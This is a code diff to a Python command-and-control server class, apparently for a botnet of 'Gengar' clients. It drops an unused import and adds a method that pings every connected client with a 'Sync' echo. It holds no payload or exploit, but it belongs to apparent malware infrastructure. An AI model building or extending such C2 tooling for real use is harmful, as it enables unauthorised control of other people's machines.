@@ -1,6 +1,5 @@
 import socket
 import threading
-from datetime import datetime
 
 from gengar import Gengar, GengarAuthenticationFailed
 from logger import logger
@@ -21,6 +20,10 @@ class CNCServer:
     @property
     def dead_gengars(self):
         return [gengar for gengar in self._gengars if not gengar.alive]
+
+    def assure_gengars_connected(self):
+        for gengar in self.gengars:
+            gengar.echo('Sync')
 
     def start(self):
         logger.info(f'Starting the CNC server at :{self.port}')
